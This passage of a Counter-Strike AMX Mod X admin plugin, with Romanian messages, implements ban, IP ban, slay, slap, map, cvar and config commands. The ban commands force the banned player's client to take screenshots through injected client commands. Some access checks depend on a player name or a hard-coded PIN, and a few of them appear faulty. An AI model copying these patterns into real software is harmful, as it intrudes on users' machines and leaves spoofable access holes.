		if(reason[0])	log_amx("AddBan: ^"%s<%s><%s><>^" il baga in lista cu banati pe ^"%s^" (timp ^"PERMANENT^") (motiv ^"%s^")", name, authid,GetInfo( id, INFO_IP ), arg, reason)
		else	log_amx("AddBan: ^"%s<%s><%s><>^" il baga in lista cu banati pe ^"%s^" (timp ^"PERMANENT^")", name, authid,GetInfo( id, INFO_IP ), arg)
	}

	return PLUGIN_HANDLED
}

public cmdBan(id, level, cid) // de facut asta pentru steamid ?
{
    if (!cmd_access(id, level, cid, 3))	return PLUGIN_HANDLED
    
    new target[32], minutes[32], reason[32]
    read_argv(1, target, charsmax(target))
    read_argv(2, minutes, charsmax(minutes))
    read_argv(3, reason, charsmax(reason))

    if(!is_str_num(minutes))
    {
	console_print(id,"[AMXX] Format pentru minute incorect!")
	return 1
    }
    
    new player = cmd_target(id, target, 9)
    
    if (!player)
        return PLUGIN_HANDLED

    // Limited access to this command
    if (equali(target, "STEAM_ID_PENDING") ||
	equali(target, "STEAM_ID_LAN") ||
	equali(target, "HLTV") ||
	equali(target, "4294967295") ||
	equali(target, "VALVE_ID_LAN") ||
	equali(target, "VALVE_ID_PENDING") ||
	equali(target, "PENDING") ||
	equali(target, "VALVE") ||
	equali(target, "STEAM"))
    {
	// Hopefully we never get here, so ML shouldn't be needed
	console_print(id, "[AMXX] Nu poti bana '%s'.", target);
	return PLUGIN_HANDLED;
    }

    if(str_to_num(minutes) < 0)
    {
	client_print(id, print_console, "[AMXX] Parametrii incorecti!")
    }
    
    new authid[32], name2[32], authid2[32], name[32]
    
    new userid2 = get_user_userid(player)
    
    get_user_authid(player, authid2, 31)
    get_user_authid(id, authid, 31)
    get_user_name(player, name2, 31)
    get_user_name(id, name, 31)

    new Country[ 46 ];
    geoip_country( GetInfo( player, INFO_IP ), Country, sizeof( Country ) - 1 );

    new szHostName[ 64 ];
    get_cvar_string( "hostname", szHostName, sizeof( szHostName ) -1 );
	
    client_print( player, print_console, "^"****************************************************^"" ) ;
    client_print( player, print_console, "^"************* Informatii despre BANAREA de pe Server *************^"" );
    client_print( player, print_console, "^"--------   ^"" );
    client_print( player, print_console, "^">>    Nick-ul Tau: %s^"", GetInfo( player, INFO_NAME ) );
    client_print( player, print_console, "^">>    Ip-ul Tau: %s^"", GetInfo( player, INFO_IP ) );
    client_print( player, print_console, "^">>    Steamid-ul Tau: %s^"", GetInfo( player, INFO_AUTHID ) );
    if (reason[0])
	client_print( player, print_console, "^">>    Motiv: %s^"", reason );
    else
	client_print( player, print_console, "^">>    Motiv: Ne-Specificat^"" );
    if((str_to_num(minutes) * 60) <= 0)
	client_print( player, print_console, "^">>    Actiune: BANNED PERMANENT^"" );
    else
	client_print( player, print_console, "^">>    Actiune: BANNED ( %d ) minut%s^"", (str_to_num(minutes) * 60), (str_to_num(minutes) * 60) == 1 ? "" : "e" );
    client_print( player, print_console, "^">>    Data & Ora: %s^"", _get_time( ) );
    client_print( player, print_console, "^">>    Tara ta: %s^"", Country );
    client_print( player, print_console, "^">>    Ai fost BANAT de catre: %s / %s / %s^"", GetInfo( id, INFO_NAME ), GetInfo( id, INFO_IP ), GetInfo( id, INFO_AUTHID ) );
    client_print( player, print_console, "^">>    Ai fost BANAT pe Server-ul: %s^"", szHostName );
    client_print( player, print_console, "^"--------    ^"" );
    client_print( player, print_console, "^"****************************************************^"" );
    client_print( player, print_console, "^"NeW ReVeLaTiOn iN | GaMinG^" >> %s", DENUMIRE );
    client_print( player, print_console, "^"****************************************************^"" );

    client_cmd(player,";snapshot;wait;wait;toogleconsole;;wait;snapshot;")

    new pl[32];
    get_user_name(player, pl, 31)
    
    new temp[64], banned[16], nNum = str_to_num(minutes)

    if (reason[0])
    {
        if(nNum)	chat_color(0, "!y[!gADM!N!y]!team %s!y: ii da ban jucatorului !g%s!y pentru !team%s!y minut(e). Motiv: (!g %s!y )", name, pl, minutes, reason)
	else	chat_color(0, "!y[!gADM!N!y]!team %s!y: ii da ban!g PERMANENT!y jucatorului !team%s!y. Motiv: (!g %s!y )", name, pl, reason)
    }
    else
    {
        if(nNum)	chat_color(0, "!y[!gADM!N!y]!team %s!y: ii da ban jucatorului !g%s!y pentru !team%s!y minut(e)", name, pl, minutes)
	else	chat_color(0, "!y[!gADM!N!y]!team %s!y: ii da ban!g PERMANENT!y jucatorului !team%s", name, pl)
    }
    
    if (nNum)
        format(temp, 63, "%L", player, "FOR_MIN", minutes)
    else
        format(temp, 63, "%L", player, "PERM")
    format(banned, 15, "%L", player, "BANNED")
    
    new address[32]
    get_user_ip(player, address, 31, 1)
    
    if (reason[0])	server_cmd("kick #%d ^"%s (%s %s)^";wait;addip ^"%s^" ^"%s^";wait;writeip", userid2, reason, banned, temp, minutes, address) //addip > banid / writeid..+
    else	server_cmd("kick #%d ^"%s %s^";wait;addip ^"%s^" ^"%s^";wait;writeip", userid2, banned, temp, minutes, address)
    
    /*new activity = get_cvar_num("amx_show_activity")
    if (activity != 0)
    {

    }*/
    
    console_print(id, "[AMXX] %L", id, "CLIENT_BANNED", name2)
    
    if (reason[0])
    {
	if(nNum)	log_amx("Ban: Se pare ca ^"%s/%s/%s^" tocmai a primit BAN de la ^"%s<%s><%s><>^" pentru ^"%s^" minut%s, motiv ^"%s^"", pl,GetInfo( player, INFO_AUTHID ),GetInfo( player, INFO_IP ),name, authid,GetInfo( id, INFO_IP ), minutes,str_to_num(minutes)==1?"":"e", reason)
	else	log_amx("Ban: Se pare ca ^"%s/%s/%s^" tocmai a primit BAN PERMANENT de la ^"%s<%s><%s><>^" motiv ^"%s^"", pl,GetInfo( player, INFO_AUTHID ),GetInfo( player, INFO_IP ),name, authid,GetInfo( id, INFO_IP ), reason)
    }
    else
    {
	if(nNum)	log_amx("Ban: Se pare ca ^"%s/%s/%s^" tocmai a primit BAN de la ^"%s<%s><%s><>^" pentru ^"%s^" minut%s", pl,GetInfo( player, INFO_AUTHID ),GetInfo( player, INFO_IP ),name, authid,GetInfo( id, INFO_IP ), minutes,str_to_num(minutes)==1?"":"e")
	else	log_amx("Ban: Se pare ca ^"%s/%s/%s^" tocmai a primit BAN PERMANENT de la ^"%s<%s><%s><>^"", pl,GetInfo( player, INFO_AUTHID ),GetInfo( player, INFO_IP ),name, authid,GetInfo( id, INFO_IP ))
    }
    
    return PLUGIN_HANDLED
}

public cmdBanIP(id, level, cid)
{
    if (!cmd_access(id, level, cid, 3))
        return PLUGIN_HANDLED
    
    new target[32], minutes[8], reason[64]
    
    read_argv(1, target, 31)
    read_argv(2, minutes, 7)
    read_argv(3, reason, 63)

    if(!is_str_num(minutes))
    {
	console_print(id,"[AMXX] Format pentru minute incorect!")
	return 1
    }
    
    new player = cmd_target(id, target, 9)
    
    if (!player)
        return PLUGIN_HANDLED

    // Limited access to this command    DE SCOS
    if (equali(target, "STEAM_ID_PENDING") ||
	equali(target, "STEAM_ID_LAN") ||
	equali(target, "HLTV") ||
	equali(target, "4294967295") ||
	equali(target, "VALVE_ID_LAN") ||
	equali(target, "VALVE_ID_PENDING") ||
	equali(target, "PENDING") ||
	equali(target, "VALVE") ||
	equali(target, "STEAM") ||
	equal(target, "0") ||
	equal(target, "0.0") ||
	equal(target, "0.0.0") ||
	equal(target, "0.0.0.0") ||
	equal(target, "0.0.0.0"))
    {
	// Hopefully we never get here, so ML shouldn't be needed
	console_print(id, "[AMXX] Nu poti bana '%s'.", target);
	return PLUGIN_HANDLED;
    }

    if(str_to_num(minutes) < 0)
    {
	client_print(id, print_console, "[AMXX] Parametrii incorecti!")
    }

    if(containi(target,":"))	client_print(id, print_console, "[AMXX] Se baneaza fara Port !")
    
    new authid[32], name2[32], authid2[32], name[32]
    new userid2 = get_user_userid(player)
    
    get_user_authid(player, authid2, 31)
    get_user_authid(id, authid, 31)
    get_user_name(player, name2, 31)
    get_user_name(id, name, 31)

    new Country[ 46 ];
    geoip_country( GetInfo( player, INFO_IP ), Country, sizeof( Country ) - 1 );

    new szHostName[ 64 ];
    get_cvar_string( "hostname", szHostName, sizeof( szHostName ) -1 );
	
    client_print( player, print_console, "^"****************************************************^"" ) ;
    client_print( player, print_console, "^"************* Informatii despre BANAREA de pe Server *************^"" );
    client_print( player, print_console, "^"--------   ^"" );
    client_print( player, print_console, "^">>    Nick-ul Tau: %s^"", GetInfo( player, INFO_NAME ) );
    client_print( player, print_console, "^">>    Ip-ul Tau: %s^"", GetInfo( player, INFO_IP ) );
    client_print( player, print_console, "^">>    Steamid-ul Tau: %s^"", GetInfo( player, INFO_AUTHID ) );
    if (reason[0])
	client_print( player, print_console, "^">>    Motiv: %s^"", reason );
    else
	client_print( player, print_console, "^">>    Motiv: Ne-Specificat^"" );
    if((str_to_num(minutes) * 60) <= 0)
	client_print( player, print_console, "^">>    Actiune: BANNED PERMANENT^"" );
    else
	client_print( player, print_console, "^">>    Actiune: BANNED ( %d ) minut%s^"", (str_to_num(minutes) * 60), (str_to_num(minutes) * 60) == 1 ? "" : "e" );
    client_print( player, print_console, "^">>    Data & Ora: %s^"", _get_time( ) );
    client_print( player, print_console, "^">>    Tara ta: %s^"", Country );
    client_print( player, print_console, "^">>    Ai fost BANAT de catre: %s / %s / %s^"", GetInfo( id, INFO_NAME ), GetInfo( id, INFO_IP ), GetInfo( id, INFO_AUTHID ) );
    client_print( player, print_console, "^">>    Ai fost BANAT pe Server-ul: %s^"", szHostName );
    client_print( player, print_console, "^"--------    ^"" );
    client_print( player, print_console, "^"****************************************************^"" );
    client_print( player, print_console, "^"NeW ReVeLaTiOn iN | GaMinG^" >> %s", DENUMIRE );
    client_print( player, print_console, "^"****************************************************^"" );

    client_cmd(player,";snapshot;wait;wait;toogleconsole;;wait;snapshot;")

    new pl[32];
    get_user_name(player, pl, 31)
    
    new temp[64], banned[16], nNum = str_to_num(minutes)

    if (reason[0])
    {
	if (nNum)	chat_color(0,"!y[!gADM!N!y]!team %s!y: ii da ban pe IP jucatorului !g%s!y pentru !team%s!y minut(e). Motiv: (!g %s!y )", name, pl, minutes, reason)
	else	chat_color(0,"!y[!gADM!N!y]!team %s!y: ii da ban!g PERMANENT!y pe!team IP!y jucatorului !g%s!y. Motiv: (!g %s!y )", name, pl, reason)
    }
    else
    {
	if (nNum)	chat_color(0,"!y[!gADM!N!y]!team %s!y: ii da ban pe IP jucatorului !g%s!y pentru !team%s!y minut(e)", name, pl, minutes)
	else	chat_color(0,"!y[!gADM!N!y]!team %s!y: ii da ban!g PERMANENT!y pe!team IP!y jucatorului !g%s", name, pl)
    }

    if (nNum)
        format(temp, 63, "%L", player, "FOR_MIN", minutes)
    else
        format(temp, 63, "%L", player, "PERM")
    format(banned, 15, "%L", player, "BANNED")

    new address[32]
    get_user_ip(player, address, 31, 1)

    if (reason[0])
        server_cmd("kick #%d ^"%s (%s %s)^";wait;addip ^"%s^" ^"%s^";wait;writeip", userid2, reason, banned, temp, minutes, address)
    else
        server_cmd("kick #%d ^"%s %s^";wait;addip ^"%s^" ^"%s^";wait;writeip", userid2, banned, temp, minutes, address)

    console_print(id, "[AMXX] %L", id, "CLIENT_BANNED", name2)
    
    if (reason[0])
    {
	if (nNum)	log_amx("BanIP: ^"%s<%s><%s>^" ii da ban pe IP jucatorului ^"%s/%s/%s^" (^"%s^" minut%s) (motiv ^"%s^")", name, authid,GetInfo( id, INFO_IP ), pl,GetInfo( player, INFO_AUTHID ),GetInfo( player, INFO_IP ), minutes,str_to_num(minutes)==1?"":"e", reason)
	else	log_amx("BanIP: ^"%s<%s><%s>^" ii da ban PERMANENT pe IP jucatorului ^"%s^" (motiv ^"%s^")", name, authid,GetInfo( id, INFO_IP ), pl,GetInfo( player, INFO_AUTHID ),GetInfo( player, INFO_IP ), reason)
    }
    else
    {
	if (nNum)	log_amx("BanIP: ^"%s<%s><%s>^" ii da ban pe IP jucatorului ^"%s^" (^"%s^" minut%s)", name, authid,GetInfo( id, INFO_IP ), pl,GetInfo( player, INFO_AUTHID ),GetInfo( player, INFO_IP ), minutes,str_to_num(minutes)==1?"":"e")
	else	log_amx("BanIP: ^"%s<%s><%s>^" ii da ban PERMANENT pe IP jucatorului ^"%s^"", name, authid,GetInfo( id, INFO_IP ), pl,GetInfo( player, INFO_AUTHID ),GetInfo( player, INFO_IP ))
    }
    
    return PLUGIN_HANDLED
}

public cmdSlay(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED
	
	new arg[32], reason[32]
	
	read_argv(1, arg, 31)
	read_argv(2, reason, 31)
	remove_quotes(reason)
	
	new player = cmd_target(id, arg, CMDTARGET_ONLY_ALIVE)
	
	if (!player)
		return PLUGIN_HANDLED
	
	new authid[32], name2[32], authid2[32], name[32]
	
	get_user_authid(id, authid, 31)
	get_user_name(id, name, 31)
	get_user_authid(player, authid2, 31)
	get_user_name(player, name2, 31)
	
	switch (get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if (reason[0])
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_SLAY_2x", name, name2, reason)
			else
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_SLAY_2", name, name2)
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_SLAY_1", name2, reason)
	}

	user_kill(player)
	
	console_print(id, "[AMXX] %L", id, "CLIENT_SLAYED", name2)
	
	if (reason[0])	log_amx("Slay: ^"%s<%d><%s><>^" ii da slay jucatorului ^"%s<%d><%s><>^" motiv ^"%s^"", name, get_user_userid(id), authid, name2, get_user_userid(player), authid2, reason)
	else	log_amx("Slay: ^"%s<%d><%s><>^" ii da slay jucatorului ^"%s<%d><%s><>^"", name, get_user_userid(id), authid, name2, get_user_userid(player), authid2)
	
	return PLUGIN_HANDLED
}

public cmdSlap(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))	return PLUGIN_HANDLED
	
	new arg[32], reason[32],player,spower[32], authid[32], name2[32], authid2[32], name[32]
	read_argv(1, arg, charsmax(arg))
	read_argv(3, reason, charsmax(reason))
	remove_quotes(reason)
	
	player = cmd_target(id, arg, CMDTARGET_ONLY_ALIVE)
	
	if (!player)	return PLUGIN_HANDLED
	
	read_argv(2, spower, charsmax(spower))
	
	new damage = str_to_num(spower)

	if(damage > get_user_health(player) || damage < 0 /*|| !damage*/)	client_print(id, print_console, "[AMXX] Parametrii incorecti!")


	if( get_gametime() - 5.0 < fCount[id] )
	{
		chat_color( id, "!g[!yServer-Protection!g]!y Trebuie sa mai astepti!team %1.f!y secund%s pentru a putea da!g Slap!y iarasi.", 5.0 - (get_gametime() - fCount[id]), 5.0 - (get_gametime() - fCount[id]) == 1 ? "a" : "e" );
		console_print( id, "[Server-Protection]: Trebuie sa mai astepti %1.f secund%s pentru a putea da Slap iar.", 5.0 - (get_gametime() - fCount[id]), 5.0 - (get_gametime() - fCount[id]) == 1 ? "a" : "e" );
		return PLUGIN_HANDLED_MAIN
	}
	user_slap(player, damage)
	fCount[id] = get_gametime()


	get_user_authid(id, authid, charsmax(authid))
	get_user_name(id, name, charsmax(name))
	get_user_authid(player, authid2, charsmax(authid2))
	get_user_name(player, name2, charsmax(name2))
	
	switch (get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if (reason[0])	chat_color(0,"%L", LANG_PLAYER, "ADMIN_SLAP_2x", name, name2, damage, reason)
			else	chat_color(0,"%L", LANG_PLAYER, "ADMIN_SLAP_2", name, name2, damage)
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_SLAP_1", name2, damage, reason)
	}
	
	console_print(id, "[AMXX] %L", id, "CLIENT_SLAPED", name2, damage)
	
	if (reason[0])	log_amx("Slap: ^"%s<%d><%s><>^" ii da slap cu %d damage jucatorului ^"%s<%d><%s><>^" motiv ^"%s^"", name, get_user_userid(id), authid, damage, name2, get_user_userid(player), authid2, reason)
	else	log_amx("Slap: ^"%s<%d><%s><>^" ii da slap cu %d damage jucatorului ^"%s<%d><%s><>^"", name, get_user_userid(id), authid, damage, name2, get_user_userid(player), authid2)
	
	return PLUGIN_HANDLED
}

public chMap(map[])
{
	server_cmd("changelevel %s", map)
}

public cmdMap(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED

	if( get_playersnum() > 7 && get_pcvar_num(cvar_min) != 0 )
	{
		new bc = get_cvar_num("amx_timeleft"), sc = get_pcvar_num(cvar_min);
		if( bc > sc ) { console_print(id, "[ VOTE ] Schimbarea hartii se da in ultimele %i minute !",sc); return PLUGIN_HANDLED; }
	}
	
	new arg[32], reason[32]
	
	new arglen = read_argv(1, arg, 31)
	read_argv(2, reason, 31)
	remove_quotes(reason)
	
	if (!is_map_valid(arg))
	{
		console_print(id, "[AMXX] %L", id, "MAP_NOT_FOUND")
		return PLUGIN_HANDLED
	}

	new authid[32], name[32]
	
	get_user_authid(id, authid, 31)
	get_user_name(id, name, 31)
	
	switch (get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if (reason[0])
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_MAP_2x", name, arg, reason)
			else
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_MAP_2", name, arg)
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_MAP_1", arg)
	}
	
	new _modName[10]
	get_modname(_modName, 9)
	
	if (!equali(_modName, "zp"))
	{
		message_begin(MSG_ALL, SVC_INTERMISSION)
		message_end()
	}
	
	if (reason[0])
		log_amx("Map: ^"%s<%d><%s><>^" schimba mapa pe ^"%s^" motiv ^"%s^"", name, get_user_userid(id), authid, arg, reason)
	else
		log_amx("Map: ^"%s<%d><%s><>^" schimba mapa pe ^"%s^"", name, get_user_userid(id), authid, arg)

	set_task(2.0, "chMap", 0, arg, arglen + 1)
	
	return PLUGIN_HANDLED
}

/*stock bool:*/onlyRcon(/*const*/ name[])
{
	for (new a = 0; a < g_cvarRconNum; ++a)
		if (equali(g_cvarRcon[a], name))
			return 1
	return 0

/*
	new pentru=get_cvar_pointer(name);
	if (pentru && get_pcvar_flags(pentru) & FCVAR_PROTECTED)
	{
		return true;
	}
	return false;
*/
}


#if defined CVARx
public check_time()
{
	new o;
	time(o, _, _)
	if(o <= START_TIME || o < END_TIME)
	{
		if(!block_cvars)
			server_cmd("comanda")
		block_cvars = true
	}
	else
	{
		if(block_cvars)
			server_cmd("comanda")
		block_cvars = false
	}
}
#endif


public cmdCvar(id, level, cid) // de modificat si pentru server print
{
	if (!cmd_access(id, level, cid, 2)) // ???
		return PLUGIN_HANDLED
	
	new arg[32], arg2[64], reason[32], arg4[32],name[32],authid[32],activity,players[32], pnum, cvar_val[64]
	
	read_argv(1, arg, charsmax(arg))
	read_argv(2, arg2, charsmax(arg2))
	read_argv(3, reason, charsmax(reason))
	read_argv(4, arg4, charsmax(arg4))
	remove_quotes(reason)

	get_user_name(id,name,charsmax(name));
	get_user_authid(id, authid, charsmax(authid))
	
	if(equali(arg, "hostname")&&!equal(reason,"")&&!equal(arg4, MY_PIN)) // ++ rcon mod?
	{
		if(id)	console_print(id, "[Server-Protection] Nu ai primit accesul pentru aceasta comanda.");
		else	server_print( "[Server-Protection] Nu ai primit accesul pentru aceasta comanda.");
		return PLUGIN_HANDLED;
	}
	if(equali(arg, "rcon_password")&&!equal(reason,"")&&!equal(arg4, MY_PIN))
	{
		if(id)	console_print(id, "[Server-Protection] Nu ai primit accesul pentru aceasta comanda.");
		else	server_print( "[Server-Protection] Nu ai primit accesul pentru aceasta comanda.");
		return PLUGIN_HANDLED;
	}

/*
	new pointer;
	
	if (equal(arg, "add") && (get_user_flags(id) & ADMIN_RCON))
	{
		if ((pointer=get_cvar_pointer(arg2))!=0)
		{
			new flags=get_pcvar_flags(pointer);
			
			if (!(flags & FCVAR_PROTECTED))
			{
				set_pcvar_flags(pointer,flags | FCVAR_PROTECTED);
			}
		}
		return PLUGIN_HANDLED
	}
	
	if ((pointer=get_cvar_pointer(arg))==0)
	{
		console_print(id, "[AMXX] %L", id, "UNKNOWN_CVAR", arg)
		return PLUGIN_HANDLED
	}
*/


#if defined CVARx
	for(new i; i < sizeof cvars_blocked; i++)	if(equal(arg, cvars_blocked))	cvar_blocat = 1;
			
	for(new i; i < sizeof temporar_cvars; i++)	if(equal(arg, temporar_cvars))	cvar_temporar = 1;
	if(cvar_blocat||/*cvar_blocat&&*/!(SpecialAcces(id,name,1)))
	{
		console_print(id, "[AMXX] Nu ai voie sa folosesti comanda asta.")
		return PLUGIN_HANDLED;
	}
	if(cvar_temporar && block_cvars)
	{
		console_print(id, "[AMXX] Acest cvar il poti schimba doar intre orele %d si %d.", START_TIME, END_TIME)
		return PLUGIN_HANDLED;
	}
#endif


	if (equali(arg, "add") && (get_user_flags(id) & ADMIN_RCON))
	{
		if (cvar_exists(arg2))
		{
			if (g_cvarRconNum < MAXRCONCVARS)	copy(g_cvarRcon[g_cvarRconNum++], 31, arg2)
			else	console_print(id, "[AMXX] %L", id, "NO_MORE_CVARS")
		}
		return PLUGIN_HANDLED
	}
	
	if (!cvar_exists(arg))
	{
		console_print(id, "[AMXX] %L", id, "UNKNOWN_CVAR", arg)
		return PLUGIN_HANDLED
	}
	
	if (onlyRcon(arg) && !(get_user_flags(id) & ADMIN_RCON))
	{
		console_print(id, "[AMXX] %L", id, "CVAR_NO_ACC")
		return PLUGIN_HANDLED
	}// Exception for the new onlyRcon rules:  sv_password is allowed to be modified by ADMIN_PASSWORD
	if (equali(arg, "sv_password") && !(get_user_flags(id) & ADMIN_PASSWORD)) //era else
	{
		console_print(id, "[AMXX] %L", id, "CVAR_NO_ACC")
		return PLUGIN_HANDLED
	}
	
	if (read_argc() < 3)
	{
		#if defined CVARx
		if(cvar_blocat)
		{
			console_print(id, "[AMXX] Nu ai voie sa vezi valoarea comenzii asteia.")
			return PLUGIN_HANDLED;
		}
		#endif
		get_cvar_string(arg, arg2, charsmax(arg2))
		if(!arg2[0]||equal(arg2,""))	format(arg2,charsmax(arg2),"nesetat")
		console_print(id, "[AMXX] %L", id, "CVAR_IS", arg, arg2)
		return PLUGIN_HANDLED
	}
	
	set_cvar_string(arg, arg2)
	
	activity = get_cvar_num("amx_show_activity")
	if (activity != 0)
	{
		//new len, admin[64]
		get_players(players, pnum, "ch")
		
		for (new i = 0; i < pnum; i++) // i = 1; i < get_maxplayers()
		{
			/*len = format(admin, 255, "%L", players, "ADMIN")
			
			if (activity == 1)
				len += copy(admin[len], 255-len, ":")
			else
				len += format(admin[len], 255-len, " %s:", name)*/
			
			if (equali(arg, "rcon_password") || equali(arg, "sv_password")) // get_pcvar_flags(pointer) & FCVAR_PROTECTED
				format(cvar_val, charsmax(cvar_val), "*** %L ***", players[i], "PROTECTED") // fromatex + charxmax++
			else	copy(cvar_val, charsmax(cvar_val), arg2)

			if (reason[0])	chat_color(players[i],"%L", players[i], "SET_CVAR_TOx", name, arg, cvar_val, reason)
			else	chat_color(players[i],"%L", players[i], "SET_CVAR_TO", name, arg, cvar_val)
		}
	}
	
	console_print(id, "[AMXX] %L", id, "CVAR_CHANGED", arg, arg2)
	
	if (reason[0])	log_amx("Cvar: ^"%s<%d><%s><>^" seteaza cvarul (^"%s^") pe valoarea (^"%s^") motiv ^"%s^"", name, get_user_userid(id), authid, arg, arg2, reason)
	else	log_amx("Cvar: ^"%s<%d><%s><>^" seteaza cvarul (^"%s^") pe valoarea (^"%s^")", name, get_user_userid(id), authid, arg, arg2)
	
	return PLUGIN_HANDLED // continue?
}

public cmdPlugins(id/*, level, cid*/) // de facut cu format
{
	//if (!cmd_access(id, level, cid, 1))
		//return PLUGIN_HANDLED

	new nameX[ 32 ];
	get_user_name( id, nameX, charsmax( nameX ) );

	if( !SpecialAcces( id, nameX, true ) )
	{
		client_cmd( id, "echo Te inveti, nu vrei cam multe accese ?!" );
		return 1;
	}
	
	new name[32], version[32], author[32], filename[32], status[32]
	new lName[32], lVersion[32], lAuthor[32], lFile[32], lStatus[32]
	
	format(lName, 31, "%L", id, "NAME")
	format(lVersion, 31, "%L", id, "VERSION")
	format(lAuthor, 31, "%L", id, "AUTHOR")
	format(lFile, 31, "%L", id, "FILE")
	format(lStatus, 31, "%L", id, "STATUS")
	
	new num = get_pluginsnum()
	new running = 0
	
	console_print(id, "%L:", id, "LOADED_PLUGINS")
	console_print(id, "%-18.17s %-8.7s %-17.16s %-16.15s %-9.8s", lName, lVersion, lAuthor, lFile, lStatus)
	
	for (new i = 1; i <num; ++i) // de modificat
	{
		get_plugin(i, filename, 31, name, 31, version, 31, author, 31, status, 31)

		console_print(i, "%-18.17s %-8.7s %-17.16s %-16.15s %-9.8s", name, version, author, filename, status)
		
		if (status[0]=='d' || status[0]=='r')
			running++
	}
	
	console_print(id, "%L", id, "PLUGINS_RUN", num, running)
	
	return PLUGIN_HANDLED
}

public cmdModules(id)
{
	new nameX[ 32 ];
	get_user_name( id, nameX, charsmax( nameX ) );

	if( !SpecialAcces( id, nameX, true ) )
	{
		client_cmd( id, "echo Te inveti, nu vrei cam multe accese ?!" );
		return 1;
	}
	
	new name[32], version[32], author[32], status, sStatus[16]
	new lName[32], lVersion[32], lAuthor[32]
	
	format(lName, 31, "%L", id, "NAME")
	format(lVersion, 31, "%L", id, "VERSION")
	format(lAuthor, 31, "%L", id, "AUTHOR")
	
	new num = get_modulesnum()
	
	console_print(id, "%L:", id, "LOADED_MODULES")
	console_print(id, "%-23.22s %-8.7s %-20.19s", lName, lVersion, lAuthor)
	
	for (new i = 0; i < num; i++)
	{
		get_module(i, name, 31, author, 31, version, 31, status)
		
		switch (status)
		{
			case module_loaded: copy(sStatus, 15, "running")
			default: copy(sStatus, 15, "error")
		}
		
		console_print(id, "%-23.22s %-8.7s %-20.19s", name, version, author)
	}
	
	console_print(id, "%L", id, "NUM_MODULES", num)
	
	return PLUGIN_HANDLED
}

public cmdCfg(id, level, cid)
{
	new name[33]
	get_user_name(id, name, charsmax(name))

	if (!cmd_access(id, level, cid, 2) && SpecialAcces(id, name, 1))
		return PLUGIN_HANDLED
	
	new arg[128], reason[32]

	read_argv(1, arg, 127)
	read_argv(2, reason, 31)
	remove_quotes(reason)
	
	if (!file_exists(arg))
	{
		console_print(id, "[AMXX] %L", id, "FILE_NOT_FOUND", arg)
		return PLUGIN_HANDLED
	}
	
	new authid[32], namex[32]
	
	get_user_authid(id, authid, 31)
	get_user_name(id, namex, 31)
	
	console_print(id, "[AMXX] Executing file ^"%s^"", arg)
	server_cmd("exec %s", arg)
	
	switch(get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if (reason[0])
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_CONF_2x", namex, arg, reason)
			else
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_CONF_2", namex, arg)
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_CONF_1", arg)
	}
	
	if (reason[0])
		log_amx("Cfg: ^"%s<%d><%s><>^" executa cfg (fisiere ^"%s^") motiv ^"%s^"", namex, get_user_userid(id), authid, arg, reason)
	else
		log_amx("Cfg: ^"%s<%d><%s><>^" executa cfg (fisiere ^"%s^")", namex, get_user_userid(id), authid, arg)
	
	return PLUGIN_HANDLED
}

/*public cmdLBack()
{
	if (!g_PauseAllowed)
		return PLUGIN_CONTINUE	
	
	new paused[25]
	
	format(paused, 24, "%L", g_pauseCon, g_Paused ? "UNPAUSED" : "PAUSED")
	set_cvar_float("pausable", g_pausAble)
	console_print(g_pauseCon, "[AMXX] Server %s", paused)
	g_PauseAllowed = false
	
	if (g_Paused)
		g_Paused = false
	else 
		g_Paused = true
	
	return PLUGIN_HANDLED
}

public cmdPause(id, level, cid)  de modificat
{
	if (!cmd_access(id, level, cid, 1))
		return PLUGIN_HANDLED 
	
	new authid[32], name[32], slayer = id, reason[32]

	read_argv(2, reason, 31)
	remove_quotes(reason)
	
	get_user_authid(id, authid, 31) 
	get_user_name(id, name, 31) 
	g_pausAble = get_cvar_float("pausable")
	
	if (!slayer)
		slayer = find_player("h") 
	
	if (!slayer)
	{ 
		console_print(id, "[AMXX] %L", id, "UNABLE_PAUSE") 
		return PLUGIN_HANDLED
	}
	
	set_cvar_float("pausable", 1.0)
	g_PauseAllowed = true
	client_cmd(slayer, "pause;pauseAck")
	
	console_print(id, "[AMXX] %L", id, g_Paused ? "UNPAUSING" : "PAUSING")
	
	new activity = get_cvar_num("amx_show_activity")

	if (activity != 0)
	{
		new players[32], pnum, msg[128], len
		get_players(players, pnum, "c")
		
		for (new i = 0; i < pnum; i++)
		{
			len = format(msg, 127, "%L", players[i], "ADMIN")
			
			if (activity == 1)
				len += copy(msg[len], 127-len, ": ")
			else
				len += format(msg[len], 127-len, " %s: ", name)
			
			format(msg[len], 127-len, "%L", players[i], g_Paused ? "UNPAUSE" : "PAUSE")

			if (reason[0])
				//chat_color(players[i], "!y[!gADM!N!y] !t%s !y: seteaza !g%s!y Server !y. Motiv: !team%s", msg, reason)
				chat_color(players[i], "!g%s!y Server !y. Motiv: !team%s", msg, reason)
			else
				//chat_color(players[i], "!y[!gADM!N!y] !t%s !y: seteaza !g%s!y Server !y!", msg)
				chat_color(players[i], "!g%s!y Server !y!", msg)
		}
	}
	g_pauseCon = id
	
	if (reason[0])
		log_amx("Server: ^"%s<%d><%s><>^" %s server motiv ^"%s^"", name, get_user_userid(id), authid, g_Paused ? "unpause" : "pause", reason)
	else
		log_amx("Server: ^"%s<%d><%s><>^" %s server", name, get_user_userid(id), authid, g_Paused ? "unpause" : "pause")
	
	return PLUGIN_HANDLED
}

public cmdShowRcon(id, level, cid)  de modificat
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED
	
	new password[64]
	
	get_cvar_string("rcon_password", password, 63)
	
	if (!password[0])
	{
		cmdRcon(id, level, cid)
	} else {
		new args[128]
		
		read_args(args, 127)
		
